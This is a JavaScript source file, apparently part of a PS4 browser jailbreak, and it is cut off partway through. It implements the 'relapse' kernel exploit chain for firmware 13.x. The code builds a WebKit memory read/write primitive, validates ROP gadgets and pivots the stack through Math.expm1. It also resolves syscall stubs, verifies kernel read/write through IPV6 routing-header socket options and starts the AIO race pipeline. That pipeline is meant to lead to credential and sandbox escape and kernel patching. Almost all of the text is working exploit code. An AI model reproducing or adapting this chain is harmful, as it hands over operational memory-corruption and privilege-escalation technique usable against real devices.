import { establishPrimitive } from "./core.js";
import { installWindowP, pairStatus } from "./mem.js";
import { int64 } from "./int64.js";
import { createContext, layoutContext, forceYield } from "./module/rop.js";
import { validateGadgets, discoverStubs } from "./module/gadgets.js";

import { loadPayload, kpatchPath, loadBinary, kpatchJmpSites, selectedPayload } from "./module/assets.js";
import { checkJailbroken } from "./check-jailbroken.js";
import { runChain, mark, state, check, trace, post, checkCounts, makePrimitiveProgress } from "./module/log.js";
import { makeRpc } from "./workers.js";
import { COMMON, RELAPSE_SYS as SYS, RELAPSE as C } from "./module/constants.js";
import { isKernelPtr, isPtrish, isPlausibleBase, sameI64 } from "./module/addr.js";
import { bufferAddress, syscallResult } from "./module/syscall.js";
import { resolvePthreadCreate, readSysentEntry, writeSysentEntry, armSysentEntry,
    readByte, isGateableJumpByte, mapRwxAtFixedAddress, copyBlobToKernel,
    mapAnonymousRwx, launchThread, rwxSizeFor, KEXEC_MAP_LO, KEXEC_MAP_HI } from "./post-exploit.js";

/*
================================================================================
RELAPSE -- its own chain, around its own kernel bug.
================================================================================

RELAPSE IS NOT LAPSE. They are two unrelated kernel bugs that happen to share a
subsystem (vfs_aio2.c) and a userland primitive:

  lapse.js    `_aio_multi_delete`      (src/kernel_bug/lapse_bug.c
                                        = FUN_ffff82507d40)
              A DOUBLE-FREE. Walks aio_obj->queue_ent[] and frees entries twice.
              Won by a suspend/resume race: a thr_new thread parks inside
              aio_multi_delete, main freezes it with thr_suspend_ucontext, then
              deletes from main.
              Firmware range: 10.00 - 12.02 ONLY.

  relapse.js  `_aio_multi_wait`        (src/kernel_bug/sys_aio_multi_wait.c
                                        = FUN_ffff8231ff70)
              A CONCURRENT-ADD-ON-WAIT bug in the waiter list. No double-free
              and no suspend/resume: the queue is corrupted by the ordinary
              aio_submit_cmd / aio_multi_wait / aio_multi_cancel sequence, and
              the leak comes out of the cancel walk.
              Firmware range: 13.02, 13.04, 13.50, 13.52.

They do not share a worker file, a race, an arming sequence or a cleanup path.
The ONLY things they share are the layers BELOW the bug -- core.js, mem.js,
module/* and the userland ROP primitive -- which is what NOTES-webkit-chain.md
section 1 means by "everything above the double-free is shared; everything below
is per-chain".

Nothing in this file should reach for lapse.js. The earlier draft of it did,
and that was wrong: it borrowed lapse's suspend/resume framing, lapse's
aio_multi_delete step and lapse's cleanup ordering for a bug that has none of
those properties. If you find a reference to lapse.js in here, it is a mistake.

FITTING NOTES -- what changed from relapse_not_fitted_yet.js
------------------------------------------------------------

The original was a standalone page: it owned its own `out`/`state` elements,
its own post()/mark()/terse()/check() logging, its own ROP context builder, its
own stub discovery, and it reached for a second, parallel offsets table. None
of that survives here -- the host already has each one, and having two of them
is exactly the drift this refit exists to remove:

  logging      -> module/log.js mark/state/check/trace/post, wired up by
                  runChain() with relapse's tag vocabulary.
  post()       -> same module, prefix PS4-RELAPSE.
  window.p     -> mem.js installWindowP().
  ROP context  -> module/rop.js createContext/layoutContext.
  gadgets      -> module/gadgets.js validateGadgets, same 15-entry table.
  stubs        -> discoverStubs(), same seed-then-scan.
  workers      -> workers.js makeRpc + the shared src/worker.js realm.
  offsets      -> window.offsetsFor() as published by main.js. Re-importing a
                  second resolver here would reintroduce the single-publisher
                  bug main.js:20-34 documents.
  jailbroken   -> check-jailbroken.js, so a second run on an already-rooted
                  console stops instead of re-racing.
  post tail    -> post-exploit.js.

The ?param= surface is preserved: jb, patch, payload, keepjb, stop, retry, n,
spray, spin, ka, towait, onum, sweep, core, reap, reapleak, park, verbose, log.

WHAT IS DELIBERATELY UNCHANGED
------------------------------

The race itself. Every constant, ordering and timing in the primitive/leak
sections is byte-for-byte what the standalone page ran -- KA/KB/PAIR, the two
passes, the node layouts, the cancel/wait pairing, the reap sequence. Those are
the parts that took the kernel dump work to get right; refitting call sites is
safe, re-deriving the race is not.
*/

const params = new URLSearchParams(location.search);

const VERBOSE = params.get("verbose") === "1";
const SHOW_LOG = params.get("log") === "1";
const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";

/* Relapse's parameter block, hoisted to module scope so the (large) pipeline
   bodies below can read them without threading an options object through every
   layer. Defaults are the original's, including ?n=262144 and ?spray=512. */
const DO_JB = params.get("jb") !== "0";
const DO_PATCH = params.get("patch") !== "0";
const DO_PAYLOAD = params.get("payload") !== "0";
const KEEP_JB = params.get("keepjb") === "1";
const REAP = params.get("reap") !== "0";
const REAPLEAK = params.get("reapleak") !== "0";
const PARK = params.get("park") === "1";
const CAPS_RESTORE = params.get("caprestore") === "1";
const NOCAPS = params.get("nocaps") === "1";

const N_LEAK = params.get("n") ? parseInt(params.get("n"), 10) : 262144;
const SPRAY = params.get("spray") ? parseInt(params.get("spray"), 10) : 512;
const SPIN = params.get("spin") ? parseInt(params.get("spin"), 10) : 40000000;
const KA = params.get("ka") ? parseInt(params.get("ka"), 10) : 32768;
const TOWAIT = params.get("towait") ? parseInt(params.get("towait"), 10) : 1000;
const ONUM_N = params.get("onum") ? parseInt(params.get("onum"), 10) : 64;
const SWEEP = params.get("sweep") ? parseInt(params.get("sweep"), 10) : 256;
const RETRY_MAX = params.get("retry") ? parseInt(params.get("retry"), 10) : 8;

/* The original's constants. Unchanged on purpose -- see the header. */
const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);
const IPPROTO_IPV6 = 41, IPV6_RTHDR = 51;
const AF_INET6 = 28, SOCK_DGRAM = 2, AF_UNIX = 1, SOCK_STREAM = 1;
const RTH_SIZE = 0x48, RTH_LEN = 8, RTH_SEGLEFT = 4;
const NODE0_DEC = 0x04000800, SCRATCH_PAGE = 0x04000000;
const SYS_MMAP = 477;
const PROT_RW = 3, MAP_PRIVATE = 2, MAP_FIXED = 0x10, MAP_ANON = 0x1000;
const NODE_SZ = 0x38;
const IPV6_TCLASS = 61, KF_MARK = 0x41;
const KERN_FILE_NUM = 15;
const TD_UCRED_OFF = 0x130;
const STEP_OFF = 2, STEP_MAG = 0x10000, PAIR = STEP_MAG + 1;
const STEPMAG = 0x1000000;
const GATE_SZ = 16;
const IDT = new int64(0x00001a00, 0xffffff80);
const CPU_LEVEL_WHICH = 3, CPU_WHICH_TID = 1, CPUSET_SZ = 0x10;
const ID64 = new int64(0xffffffff, 0xffffffff);

/* Post-exploit field offsets (identical to lapse's cr_/fd_ layout). */
const P_UCRED = 0x40, P_FD = 0x48, TD_PROC = 0x8;
const CR_UID = 0x04, CR_RUID = 0x08, CR_SVUID = 0x0c, CR_NGROUPS = 0x10;
const CR_RGID = 0x14, CR_PRISON = 0x30, CR_SCECAPS1 = 0x60, CR_SCECAPS0 = 0x68;
const FD_RDIR = 0x10, FD_JDIR = 0x18;

/* Process-list walk constants. p_list_next at +0x00, p_pid at +0xb0 -- the
   same layout NOTES-webkit-chain.md:193-197 gives for the kProc workaround. */
const P_LIST_NEXT = 0x00, P_PID = 0xb0;
const PROC_WALK_MAX = 4096;

/*
Resolve prison0 / rootvnode BY WALKING THE PROCESS LIST, not from a table.

Why this exists at all -- NOTES-webkit-chain.md:184-199: the jailbreak RVAs
(PRISON0 / ROOTVNODE) are valid for a chain running under a full libkernel
build, but our chains run in the Internet Browser against libkernel_web.sprx,
where those same RVAs do NOT address those structures. So we derive them from
the process itself:

    kProc     <- walk p_list_next (+0x00) from curproc until p_pid(+0xb0) == 0
    prison0   <- kProc.p_ucred(+0x40).cr_prison(+0x30)
    rootvnode <- kProc.p_fd(+0x48).fd_rdir(+0x10)

pid 0 is the kernel process (swapper), whose own prison and root are the
system-wide ones -- that is exactly what the ucred write wants.

Returns int64s, or nulls if the walk does not reach pid 0 within the bound, so
the caller's kptr() check refuses instead of writing to a bogus address.
*/
function resolvePrisonAndRoot(curproc) {
    if (!isKernelPtr(curproc)) return { kProc: null, prison0: null, rootvnode: null, walked: 0 };
    let proc = curproc, walked = 0;
    while (walked < PROC_WALK_MAX) {
        const pid = read8K(proc.add32(P_PID)).low >>> 0;
        if (pid === 0) break;
        const next = read8K(proc.add32(P_LIST_NEXT));
        if (!isKernelPtr(next)) return { kProc: null, prison0: null, rootvnode: null, walked: walked };
        proc = next;
        walked++;
    }
    if (walked >= PROC_WALK_MAX)
        return { kProc: null, prison0: null, rootvnode: null, walked: walked };

    const ucred = read8K(proc.add32(P_UCRED));
    const prison0 = isKernelPtr(ucred) ? read8K(ucred.add32(CR_PRISON)) : null;
    const pfd = read8K(proc.add32(P_FD));
    const rootvnode = isKernelPtr(pfd) ? read8K(pfd.add32(FD_RDIR)) : null;
    return { kProc: proc, prison0: prison0, rootvnode: rootvnode, walked: walked };
}

const NEG1 = new int64(0xffffffff, 0xffffffff);

/* ---- module-scope driver state -------------------------------------------
   Mirrors netctrl's driver-state block: the pipeline is split into named
   functions and these are the handles they share. */
const keepAlive = [];
const opened = [];

/*
DRIVER STATE. Same shape as netctrl.js's block: the pipeline is split into
stages, so every handle they share lives here instead of inside one function.
The values and their initialisers are the standalone chain's -- this is a move,
not a rewrite.
*/
let p = null, off = null, fwKey = "unknown";
let G = null, M = null, argGadget = null;
let sc = null, callAddr = null, errno = null;
let stubAddr = null, errorFn = null;
let webkitBase = null, libkernelBase = null;
let mainMf = null, mainOrig = null, mainArmed = false;
let pinRestore = null;
let jbRestoreHook = null;
let bufAddr = null;
let pid = 0;

/*
Shared AIO / node state. These were `const` locals of the standalone IIFE and
had to be hoisted for the same reason netctrl hoisted argGadget/iovAb: the
cleanup pass (relapseAdaptCleanup) and the post-exploit tail both reach them,
and they are different functions from the one that creates them. The NODE_SZ
arena, the leak/mutex buffers and the id batch are all here.
*/
let armCount = 0;
let waitMs = -1;
let reapedGen = -1;
let POOL = [];
let idAd = 0, stAd = 0, toAd = 0, toDv = null;
let arAd = 0, arDv = null, MAXN = 0;
let DUM = 0, SNK = 0, N0SINK = 0;
let snkDv = null, dumDv = null;
let M_AD = 0, mU32 = null, mU8 = null;
let lkDv = null, lkNdv = null, lkNad = 0;
let pAd = 0, pDv = null;
let CT1 = null, UCRED = null, KBASE = null;

/* Post-exploit state, mirroring netctrl's. */
let kpatch = null, payload = null;
let KPATCH_JMP_SITES = [];
let jailbroken = false, kpatched = false, payloadRunning = false;
let rebootRequired = false, committed = false;
let allDone = false;

function put(dv, at, v) {
    if (v === null || v === undefined) { dv.setUint32(at, 0, true); dv.setUint32(at + 4, 0, true); return; }
    if (typeof v === "number") {
        dv.setUint32(at, v >>> 0, true);
        dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
    } else {
        dv.setUint32(at, v.low >>> 0, true);
        dv.setUint32(at + 4, v.hi >>> 0, true);
    }
}

function alloc(n) {
    const ab = new ArrayBuffer(n);
    keepAlive.push(ab);
    return { addr: bufAddr(ab), dv: new DataView(ab), u8: new Uint8Array(ab) };
}

/* Single firmware resolver, same as lapse.js and netctrl.js: main.js is the
   only publisher of window.offsetsFor (see its comment at main.js:20-34). */
function offsetsFor(ua) {
    if (typeof window === "undefined" || typeof window.offsetsFor !== "function")
        throw new Error("offsetsFor is not installed -- main.js must run first");
    return window.offsetsFor(ua);
}

export function run(options) {
    return runChain({
        ...options,
        postPrefix: "PS4-RELAPSE",
        postRawDetail: true,
        badRe: /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED/i,
        warnRe: /WARN|SKIP|REFUSED|COMMITTED|DIRTY|GIVEUP/i,
        okRe: /\bOK\b|PASS|ACHIEVED|RUNNING|ARMED|PROVEN|ANCHORED/i,
    }, runRelapse);
}

/*
Benign-miss auto-retry. A passA/passB "no crossing" is a recoverable reclaim
miss in the READ phase -- no kernel .data/.text has been touched yet, so
reloading and retrying is safe. The counter lives in sessionStorage so it
survives the reload and is cleared the moment the read phase succeeds.
NEVER call retryBenign() after a kernel write: a reload would re-enter with the
kernel already modified. A hard KP (a total miss that faults inside the cancel
walk) cannot be caught here and still needs a reboot.
*/
const RETRY_KEY = "relapse-read-retry";
function retryCount() {
    try { return parseInt(sessionStorage.getItem(RETRY_KEY) || "0", 10) || 0; }
    catch (e) { return 0; }
}
function clearRetry() { try { sessionStorage.removeItem(RETRY_KEY); } catch (e) { } }
function retryBenign(why) {
    const n = retryCount();
    if (n >= RETRY_MAX) {
        mark("AUTO-RETRY-GIVEUP", "why=" + why + " after " + n
            + " reloads -- reboot and try again");
        return false;
    }
    try { sessionStorage.setItem(RETRY_KEY, String(n + 1)); } catch (e) { }
    mark("AUTO-RETRY", "why=" + why + " reload " + (n + 1) + "/" + RETRY_MAX
        + " (benign read miss, no kernel write yet)");
    setTimeout(function () { try { location.reload(); } catch (e) { } }, 400);
    return true;
}

/* ============================================================================
   STAGE 1: primitive, bases, gadgets, stubs, ROP gate
   ============================================================================ */
async function stagePrimitive() {
    mark("FW", fwKey || "(not a PS4 UA)");

    const NEED_K = [
        "k_idt_rsvd",
        "k_oid_kern_file", "k_oid_maxfilesperproc", "k_oid_maxprocperuid",
        "k_oid_maxfiles",
        "k_arg1_maxfilesperproc", "k_arg1_maxprocperuid", "k_arg1_maxfiles",
        "k_prison0", "k_rootvnode",
    ];
    const missing = NEED_K.filter(k => off[k] === undefined);
    if (!check("kernel-table-present", missing.length === 0,
        "fw=" + fwKey + " missing=[" + missing.join(",") + "]"
        + " -- dump this firmware with kdump5.html and derive its table"
        + " with tools/kderive.py; stage=pre_primitive")) return false;

    /* kpatch/payload table gates, same as the standalone page's pre-flight. */
    const needPatch = ["k_sysent_661", "k_jmp_rsi"].filter(k => off[k] === undefined);
    if (!check("kpatch-table-present", !DO_PATCH || needPatch.length === 0,
        "missing=[" + needPatch.join(",") + "] blob=" + kpatchPath(fwKey, off)
        + " -- build it from patches/<fw>.c, see patches/1300.c")) return false;
    /* NOTE: there is no per-firmware payload name. The HEN blob is the USER's
       selection (goldhen.bin / hen.bin / custom payload.bin), resolved by
       module/assets.js from the UI dropdown. The gate is on the two keys the
       launch actually needs; the file itself is fetched later by name. */
    const needPl = ["wk___imp_pthread_create", "k_pthread_create"].filter(k => off[k] === undefined);
    if (!check("payload-table-present", !DO_PAYLOAD || needPl.length === 0,
        "missing=[" + needPl.join(",") + "] payload=" + selectedPayload())) return false;

    mark("FW-STATUS", "kernel_table=present");
    mark("FW-KTABLE", "idt_rsvd=0x" + off.k_idt_rsvd.toString(16)
        + " prison0=0x" + off.k_prison0.toString(16)
        + " rootvnode=0x" + off.k_rootvnode.toString(16)
        + " kpatch=" + kpatchPath(fwKey, off)
        + " src=offset.js");

    if (retryCount() > 0)
        mark("AUTO-RETRY-RESUME", "read-phase retry " + retryCount() + "/" + RETRY_MAX);

    state("running the primitive...", "warn");
    await forceYield();

    const progress = makePrimitiveProgress(6);
    const carrier = await establishPrimitive({ maxAttempts: 6, onEvent: progress.onEvent });
    progress.done("ok");
    installWindowP(carrier, { promote: false, onEvent: progress.onEvent });
    if (!window.p) throw new Error("window.p was not installed");
    p = window.p;
    bufAddr = ab => bufferAddress(p, off, ab);
    mark("PAIR-STATUS", "state=" + pairStatus.state
        + " promoted=" + pairStatus.promoted
        + "   (promotion off: the 137 MB stays pinned)");
    mark("PRIMITIVE-OK", "");

    const cell = p.leakval(Math.expm1);
    const nativeFn = p.read8(p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function));
    webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
    errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
    libkernelBase = errorFn.sub32(off.k__error);
    mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
    if (!check("module-bases-0x4000-aligned",
        isPlausibleBase(webkitBase) && isPlausibleBase(libkernelBase), "")) return false;

    const GAD = [
        ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3]],
        ["POP_RSI_RET", off.wk_POP_RSI_RET, [0x5e, 0xc3]],
        ["POP_RDX_RET", off.wk_POP_RDX_RET, [0x5a, 0xc3]],
        ["POP_RCX_RET", off.wk_POP_RCX_RET, [0x59, 0xc3]],
        ["POP_R8_RET", off.wk_POP_R8_RET, [null, 0x58, 0xc3]],
        ["POP_R9_RET", off.wk_POP_R9_RET, [null, 0x59, 0xc3]],
        ["POP_RAX_RET", off.wk_POP_RAX_RET, [0x58, 0xc3]],
        ["LEAVE_RET", off.wk_LEAVE_RET, [0xc9, 0xc3]],
        ["MOV_RDI_RAX_RET", off.wk_MOV_QWORD_PTR_RDI_RAX_RET, [0x48, 0x89, 0x07, 0xc3]],
        ["G0", off.wk_MOV_RDI_RSI_30_CALL, [0x48, 0x8b, 0x7e, 0x30], true],
        ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18, [0x58, 0x48, 0x8b, 0x07], true],
        ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10, [0x55, 0x48, 0x89, 0xe5], true],
        ["G3", off.wk_MOV_RDI_RAX_8_CALL_20, [0x48, 0x8b, 0x78, 0x08], true],
        ["G4", off.wk_MOV_RDX_RAX_18_CALL_10, [0x48, 0x8b, 0x50, off.pivot_view_sp], true],
        ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [0x52, 0x5c, 0xc3], true],
    ];
    const gv = validateGadgets(p, webkitBase, GAD, hexBytesLocal, mark,
        { mismatchTag: "GADGET-BAD" });
    G = gv.gadgets;
    if (!check("gadget-table-fits-module", !gv.fatal, gv.gated + "/" + gv.total)) return false;
    argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET,
        G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];

    /* Stub discovery: the original's seed-then-scan, shared. */
    const disc = discoverStubs(p, libkernelBase, off, SYS);
    stubAddr = disc.stubAddr;
    mark("STUBS", "seeded=" + disc.seeded + " scanned=" + disc.scanned);
    const miss = Object.keys(SYS).filter(k => !stubAddr.has(SYS[k]));
    if (!check("syscall-page-needs-stub", miss.length === 0, miss.join(","))) return false;

    M = createContext({ p, offsets: off, gadgets: G, keepAlive });
    mainMf = p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function);
    mainOrig = p.read8(mainMf);
    const pivotObj = {};
    keepAlive.push(pivotObj);
    const pivotCell = p.leakval(pivotObj);
    p.write8(mainMf, G.G0);
    mainArmed = true;
    callAddr = function (target, args) {
        layoutContext(M, off, G, argGadget, JSVALUE_UNDEFINED, target, args);
        const saved = p.read8(pivotCell);
        p.write8(pivotCell, M.S);
        Math.expm1(pivotObj);
        p.write8(pivotCell, saved);
        return syscallResult(M.frameDv);
    };
    sc = (num, ...a) => callAddr(stubAddr.get(num), a);
    errno = function () {
        const r = callAddr(errorFn, []);
        const a = new int64(r.lo, r.hi);
        return (a.hi === 0 && a.low === 0) ? -1 : p.read4(a) | 0;
    };

    pid = sc(SYS.getpid).i32;
    check("chain-reaches-kernel", pid > 0, "pid=" + pid + " uid=" + sc(SYS.getuid).i32);
    const jb = checkJailbroken({ sc, sys: SYS, mark, state });
    if (jb.alreadyJailbroken) return "already-jailbroken";
    return true;
}

/* hexBytes is imported; the local alias keeps the validateGadgets call site
   reading like the original's. */
function hexBytesLocal(a) {
    let s = "";
    for (let i = 0; i < a.length; ++i) s += (i ? " " : "") + (a[i] < 16 ? "0" : "") + (a[i] & 0xff).toString(16);
    return s;
}

/* ============================================================================
   STAGE 2: scratch page + kernel R/W verification through IPV6_RTHDR
   ============================================================================ */
async function stageThreads() {
    const scratchAb = new ArrayBuffer(0x1000); keepAlive.push(scratchAb);
    const scratch = bufAddr(scratchAb);
    const argAb = new ArrayBuffer(8); keepAlive.push(argAb);
    const argAddr = bufAddr(argAb), argDv = new DataView(argAb);
    const lenAb = new ArrayBuffer(8); keepAlive.push(lenAb);
    const lenAddr = bufAddr(lenAb), lenDv = new DataView(lenAb);

    async function bringWorker(name) {
        const w = { name: name, armed: false, wired: false };
        w.worker = new Worker("src/worker.js");
        w.rpc = makeRpc(w.worker, name, undefined,
            (n, msg) => mark("WORKER-ONERROR", n + " " + msg));
        if ((await w.rpc("ping", 15000)) !== "pong") throw new Error(name + " ping");
        const sLo = 0x10100000, sHi = 0xc0de0000;
        const arr = await w.rpc("init", 15000, sLo, sHi);
        keepAlive.push(arr);
        const D = bufAddr(arr.buffer);
        if (p.read4(D) >>> 0 !== sLo) throw new Error(name + " transfer");
        const storage = p.read8(D.add32(0x10));
        const mc = isPtrish(storage) ? p.read8(storage.add32(8)) : null;
        if (!mc || !isPtrish(mc)) throw new Error(name + " walk");
        const bf = p.read8(mc.add32(8));
        let wm = null, wv = null, wl = null;
        for (let k = 1; k <= 8; ++k) {
            const val = p.read8(bf.sub32(8 * k));
            if (!isPtrish(val)) continue;
            const inl = p.read8(val.add32(0x10));
            const len = p.read4(val.add32(0x18)) >>> 0;
            if (inl.hi === 0 && inl.low === 2) { if (!wl) wl = val; }
            else if (inl.hi > 0 && len === 6) { if (!wm) wm = val; }
            else if (inl.hi > 0 && len === 0x30) { if (!wv) wv = val; }
        }
        if (!(wm && wv && wl)) throw new Error(name + " shapes");
        w.master = wm;
        w.origVector = p.read8(wm.add32(0x10));
        p.write8(wm.add32(0x10), wv);
        w.wired = true;
        await w.rpc("setup", 15000, wl.low, wl.hi);
        await w.rpc("armPivot", 15000, G.G0.low, G.G0.hi);
        w.armed = true;
        w.ctx = createContext({ p, offsets: off, gadgets: G, keepAlive });
        w.fire = function (num, args, ms) {
            layoutContext(w.ctx, off, G, argGadget, JSVALUE_UNDEFINED, stubAddr.get(num), args);
            return w.rpc("fire", ms === undefined ? 20000 : ms, w.ctx.S.low, w.ctx.S.hi);
        };
        return w;
    }
    const w1 = await bringWorker("w1");
    const w2 = await bringWorker("w2");
    await w1.fire(SYS.getpid, []);
    const w1pid = w1.ctx.frameDv.getUint32(0, true) | 0;
    await w2.fire(SYS.getpid, []);
    const w2pid = w2.ctx.frameDv.getUint32(0, true) | 0;
    check("pr-two-workers-reach-kernel", w1pid > 0 && w2pid > 0,
        "w1 getpid=" + w1pid + " w2 getpid=" + w2pid + " main=" + sc(SYS.getpid).i32);

    const mr = sc(SYS_MMAP, SCRATCH_PAGE, 0x10000, PROT_RW,
        MAP_FIXED | MAP_ANON | MAP_PRIVATE, -1, 0);
    const mgot = new int64(mr.lo, mr.hi);
    if (!check("pr-scratch-page-mapped",
        mgot.hi >>> 0 === 0 && mgot.low >>> 0 === SCRATCH_PAGE,
        "got=0x" + (mgot.low >>> 0).toString(16))) return null;

    const vs = sc(SYS.socket, AF_INET6, SOCK_DGRAM, 0).i32;
    if (vs < 0) { mark("PR-ABORT", "verify socket"); return null; }
    opened.push(vs);
    {
        const tAb = new ArrayBuffer(RTH_SIZE); keepAlive.push(tAb);
        const tDv = new DataView(tAb);
        tDv.setUint8(1, RTH_LEN);
        tDv.setUint8(3, RTH_SEGLEFT);
        sc(SYS.setsockopt, vs, IPPROTO_IPV6, IPV6_RTHDR, bufAddr(tAb), RTH_SIZE);
        const RT = SCRATCH_PAGE + 0x2000;
        lenDv.setUint32(0, RTH_SIZE, true);
        lenDv.setUint32(4, 0, true);
        const g1 = sc(SYS.getsockopt, vs, IPPROTO_IPV6, IPV6_RTHDR, RT, lenAddr).i32;
        const s2 = sc(SYS.setsockopt, vs, IPPROTO_IPV6, IPV6_RTHDR, RT,
            lenDv.getUint32(0, true)).i32;
        if (!check("pr-scratch-page-kernel-rw", g1 === 0 && s2 === 0,
            "copyout=" + g1 + " copyin=" + s2)) return null;
    }
    return { w1, w2, argAddr, argDv, lenAddr, lenDv };
}

/* ============================================================================
   STAGE 3: the AIO leak-and-anchor pipeline
   ============================================================================
   Everything from here to the anchor verdict is the standalone chain's body,
   carried over with only call sites adapted. Layout, ordering and constants
   are unchanged.
   ============================================================================ */
async function stageAnchor(env) {
    const { w1, w2, argAddr, argDv, lenAddr, lenDv } = env;

    /*
    These are DRIVER STATE (see the block near the top), assigned not declared.
    The standalone page held them as consts inside one IIFE; here the anchor
    stage, the KRW stage and relapseAdaptCleanup are three functions, so every
    one of them has to be reachable from the others -- the argGadget/iovAb/
    boundedJoin lesson netctrl.js records four times over.
    */
    const mAb = new ArrayBuffer(0x40); keepAlive.push(mAb);
    mU32 = new Uint32Array(mAb); keepAlive.push(mU32);
    mU8 = new Uint8Array(mAb); keepAlive.push(mU8);
    M_AD = bufAddr(mAb);
    mU32.fill(0);
    mU32[6] = 4;
    const OWNER_LO = 6, OWNER_HI = 7;
    const lkAb = new ArrayBuffer(0x40); keepAlive.push(lkAb);
    lkDv = new DataView(lkAb);
    const lkAd = bufAddr(lkAb);
    const LX = lkAd.add32(0x00), LC = lkAd.add32(0x10);

    const NBLOCK = 8;
    const bspAb = new ArrayBuffer(8); keepAlive.push(bspAb);
    const bspDv = new DataView(bspAb);
    if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, bufAddr(bspAb)).i32 !== 0) {
        mark("PR-ABORT", "block socketpair");
        return null;
    }
    const bsp0 = bspDv.getInt32(0, true), bsp1 = bspDv.getInt32(4, true);
    opened.push(bsp0, bsp1);
    const brbAb = new ArrayBuffer(0x40); keepAlive.push(brbAb);
    const brqAb = new ArrayBuffer(NBLOCK * 0x28); keepAlive.push(brqAb);
    const brqDv = new DataView(brqAb);
    for (let k = 0; k < NBLOCK; k++) {
        const b = k * 0x28;
        put(brqDv, b + 0x08, 0x40);
        put(brqDv, b + 0x10, bufAddr(brbAb));
        brqDv.setInt32(b + 0x20, bsp0, true);
    }
    const bidAb = new ArrayBuffer(NBLOCK * 4); keepAlive.push(bidAb);

    const mskAb = new ArrayBuffer(CPUSET_SZ); keepAlive.push(mskAb);
    const mskDv = new DataView(mskAb), mskAd = bufAddr(mskAb);
    new Uint8Array(mskAb).fill(0);
    const affGot = sc(SYS.cpuset_getaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
        ID64, CPUSET_SZ, mskAd).i32;
    const savedMask = mskDv.getUint32(0, true) >>> 0;
    const cores = [];
    for (let i = 0; i < 32; i++) if (savedMask & (1 << i)) cores.push(i);
    mark("PIN-AVAIL", "rv=" + affGot + " mask=0x" + savedMask.toString(16)
        + " cores=" + cores.join(","));
    if (!check("pin-read-mask", affGot === 0 && cores.length > 0,
        "rv=" + affGot + " cores=" + cores.length)) return null;

    const PINCORE = params.get("core") ? parseInt(params.get("core"), 10) : cores[0];
    new Uint8Array(mskAb).fill(0);
    mskDv.setUint32(0, (1 << PINCORE) >>> 0, true);
    const affSet = sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
        ID64, CPUSET_SZ, mskAd).i32;
    new Uint8Array(mskAb).fill(0);
    sc(SYS.cpuset_getaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID, ID64, CPUSET_SZ, mskAd);
    const backMask = mskDv.getUint32(0, true) >>> 0;
    mark("PIN-SET", "core=" + PINCORE + " rv=" + affSet
        + " reads back 0x" + backMask.toString(16));
    if (!check("MAIN-PINNED", affSet === 0 && backMask === (1 << PINCORE) >>> 0,
        "core=" + PINCORE + " mask=0x" + backMask.toString(16)
        + " (free and malloc in armOnce now share one UMA per-cpu bucket)")) return null;

    const OTHER = cores.length > 1
        ? (cores[0] === PINCORE ? cores[cores.length - 1] : cores[0]) : PINCORE;
    const msk2Ab = new ArrayBuffer(CPUSET_SZ); keepAlive.push(msk2Ab);
    const msk2Dv = new DataView(msk2Ab), msk2Ad = bufAddr(msk2Ab);
    new Uint8Array(msk2Ab).fill(0);
    msk2Dv.setUint32(0, (1 << OTHER) >>> 0, true);
    let wpin = "skipped";
    if (OTHER !== PINCORE) {
        const aw = [CPU_LEVEL_WHICH, CPU_WHICH_TID, ID64, CPUSET_SZ, msk2Ad];
        await w1.fire(SYS.cpuset_setaffinity, aw);
        const r1 = w1.ctx.frameDv.getUint32(0, true) | 0;
        await w2.fire(SYS.cpuset_setaffinity, aw);
        const r2 = w2.ctx.frameDv.getUint32(0, true) | 0;
        wpin = "w1=" + r1 + " w2=" + r2;
        check("WORKERS-PINNED", r1 === 0 && r2 === 0,
            "workers on core " + OTHER + ", main on " + PINCORE + " -- " + wpin);
    } else {
        mark("PIN-ONE-CORE", "only one core available, workers share it");
    }
    mark("PIN-SPLIT", "main=" + PINCORE + " workers=" + OTHER + " " + wpin);

    pinRestore = function () {
        new Uint8Array(mskAb).fill(0);
        mskDv.setUint32(0, savedMask, true);
        const r = sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
            ID64, CPUSET_SZ, mskAd).i32;
        mark("PIN-RESTORED", "rv=" + r + " mask=0x" + savedMask.toString(16));
    };

    mark("PR-SATURATE", "rv=" + sc(SYS.aio_submit_cmd, 1 | 0x1000,
        bufAddr(brqAb), NBLOCK, 3, bufAddr(bidAb)).i32);

    const spAb = new ArrayBuffer(8); keepAlive.push(spAb);
    const spDv = new DataView(spAb);
    if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, bufAddr(spAb)).i32 !== 0) {
        mark("PR-ABORT", "socketpair");
        return null;
    }
    const sp0 = spDv.getInt32(0, true), sp1 = spDv.getInt32(4, true);
    opened.push(sp0, sp1);
    const rbAb = new ArrayBuffer(0x40); keepAlive.push(rbAb);
    const rqAb = new ArrayBuffer(0x50); keepAlive.push(rqAb);
    const rqDv = new DataView(rqAb);
    for (let k = 0; k < 2; k++) {
        const b = k * 0x28;
        put(rqDv, b + 0x08, 0x40);
        put(rqDv, b + 0x10, bufAddr(rbAb));
        rqDv.setInt32(b + 0x20, sp0, true);
    }
    const idAb2 = new ArrayBuffer(8); keepAlive.push(idAb2);
    idAd = bufAddr(idAb2);
    const stAb2 = new ArrayBuffer(8); keepAlive.push(stAb2);
    stAd = bufAddr(stAb2);
    const toAb = new ArrayBuffer(8); keepAlive.push(toAb);
    toDv = new DataView(toAb);
    toAd = bufAddr(toAb);

